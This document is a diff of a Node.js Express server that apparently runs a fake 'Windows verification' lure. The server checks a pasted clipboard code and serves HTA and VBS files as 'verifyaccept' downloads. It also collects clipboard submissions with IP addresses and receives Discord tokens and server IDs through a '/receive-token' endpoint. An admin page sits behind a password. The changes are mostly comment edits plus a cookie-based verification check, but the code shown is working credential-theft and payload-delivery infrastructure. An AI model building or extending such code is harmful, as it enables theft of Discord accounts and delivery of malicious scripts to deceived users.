@@ -4,12 +4,12 @@ const fs = require('fs');
 const path = require('path');
 const bodyParser = require('body-parser');
 const https = require('https');
-const cookieParser = require('cookie-parser'); // Add cookie parser middleware
+const cookieParser = require('cookie-parser');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.use(bodyParser.json());
-app.use(cookieParser());  // <-- Add this to enable reading cookies
+app.use(cookieParser());
 app.use(express.static('public'));
 app.set('view engine', 'html');
 app.engine('html', require('ejs').renderFile);
@@ -17,7 +17,6 @@ app.engine('html', require('ejs').renderFile);
 function getRealIP(req) {
   const forwarded = req.headers['x-forwarded-for'];
   if (forwarded) {
-    // Take only the first IP from the comma-separated list
     return forwarded.split(',')[0].trim();
   }
   
@@ -33,7 +32,7 @@ const codeMap = {}; // Stores IP -> code
 
 app.get('/generate-verification-code', (req, res) => {
   const ip = getRealIP(req);
-  console.log('GENERATE - IP:', ip); // ADD THIS
+  console.log('GENERATE - IP:', ip);
   const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
   let code = "";
   for (let i = 0; i < 4; i++) code += chars[Math.floor(Math.random() * chars.length)];
@@ -45,23 +44,31 @@ app.get('/generate-verification-code', (req, res) => {
 
 app.post('/verify-windows-code', (req, res) => {
   const ip = getRealIP(req);
-  console.log('VERIFY - IP:', ip); // ADD THIS
+  console.log('VERIFY - IP:', ip);
 
   const { clipboard } = req.body;
   const expectedCode = codeMap[ip];
   if (!expectedCode) return res.status(400).json({ success: false, error: "No code generated." });
   if (!clipboard.includes(expectedCode)) return res.status(401).json({ success: false, message: "Verification failed." });
-  // ADD THESE DEBUG LOGS
+  
   console.log('IP:', ip);
   console.log('Expected code:', expectedCode);
   console.log('Clipboard contains:', clipboard);
   console.log('Match check:', clipboard.includes(expectedCode));
 
-  // Set verification cookies - removed httpOnly and fixed capitalization
+  // Set verification cookies
   res.cookie('windowsVerified', '1', { maxAge: 24 * 60 * 60 * 1000 });
   res.cookie('tokenGateVerified', '1', { maxAge: 24 * 60 * 60 * 1000 });
   
   res.json({ success: true });
+});
+
+// Check verification status endpoint
+app.get('/check-verification', (req, res) => {
+  const isVerified = req.cookies && 
+    (req.cookies.windowsVerified === '1' || req.cookies.tokenGateVerified === '1');
+  
+  res.json({ verified: isVerified });
 });
 
 // Serve verification pages
@@ -82,7 +89,7 @@ app.get('/verify', (req, res) => {
 app.get('/verify-windows', (req, res) => res.sendFile(path.join(__dirname, 'public/verify-windows.html')));
 app.get('/verifynotwindows', (req, res) => res.sendFile(path.join(__dirname, 'public/verifynotwindows.html')));
 
-// Serve the HTA file correctly here:
+// Serve the HTA file correctly
 app.get('/verifyaccept.hta', (req, res) => {
   res.set({
     'Content-Type': 'application/hta',
@@ -157,7 +164,7 @@ app.get('/get-ip', (req, res) => {
   res.json({ ip: userIP });
 });
 
-// Handle clipboard submissions (updated with IP logging)
+// Handle clipboard submissions
 app.post('/submit-clipboard', (req, res) => {
   const { clipboardData, userIP, type } = req.body;
   const realIP = userIP || getRealIP(req);
@@ -204,7 +211,7 @@ app.post('/submit-clipboard', (req, res) => {
   });
 });
 
-// Handle Discord token submissions (updated for GET requests)
+// Handle Discord token submissions (GET endpoint)
 app.get('/receive-token', (req, res) => {
   const { token, serverId } = req.query;
   const realIP = getRealIP(req);
@@ -260,7 +267,7 @@ app.get('/receive-token', (req, res) => {
     </style>
   </head>
   <body>
-    <div class="success">✅ Server token recieved!!</div>
+    <div class="success">✅ Server token received!!</div>
     <p>Check the console for your server token!!</p>
     <p>You can close this tab now.</p>
     <script>setTimeout(() => window.close(), 2000);</script>
@@ -315,7 +322,7 @@ app.post('/receive-token', (req, res) => {
   res.sendStatus(200);
 });
 
-// Admin endpoint (updated)
+// Admin endpoint
 app.get('/admin', (req, res) => {
   const provided = req.query.password;
   const correct = process.env.ADMIN_PASSWORD;
@@ -363,16 +370,14 @@ app.get('/admin', (req, res) => {
   res.send(adminHTML);
 });
 
-app.get('/verify', (req, res) => res.sendFile(path.join(__dirname, 'public/verify.html')));
-app.get('/verify-windows', (req, res) => res.sendFile(path.join(__dirname, 'public/verify-windows.html')));
-app.get('/verifynotwindows', (req, res) => res.sendFile(path.join(__dirname, 'public/verifynotwindows.html')));
+// Additional static routes
 app.get('/verifyaccept.vbs', (req, res) => {
   res.set('Content-Type', 'application/x-vbs');
   res.sendFile(path.join(__dirname, 'public/verifyaccept.vbs'));
 });
 
 app.get('/download', (req, res) => {
-  res.download(path.join(__dirname, 'public', 'example.zip')); // or your real file!
+  res.download(path.join(__dirname, 'public', 'example.zip'));
 });
 
 app.listen(PORT, () => {
